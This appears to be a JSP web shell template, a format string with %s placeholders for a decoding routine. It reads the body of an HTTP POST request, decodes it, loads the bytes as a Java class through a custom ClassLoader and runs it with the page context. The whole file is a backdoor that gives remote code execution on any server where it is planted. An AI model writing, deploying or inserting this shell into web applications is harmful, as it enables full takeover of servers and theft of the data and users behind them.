<%%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %%>
<%%!
%s
%%>
<%%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return
        super.defineClass(b,0,b.length);}}%%><%%if (request.getMethod().equals("POST")){
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[512];
            int length=request.getInputStream().read(buf);
            while (length>0)
            {
                byte[] data= Arrays.copyOfRange(buf,0,length);
                bos.write(data);
                length=request.getInputStream().read(buf);
            }
        new U(this.getClass().getClassLoader()).g(%s(bos.toByteArray())).newInstance().equals(pageContext);}
%%>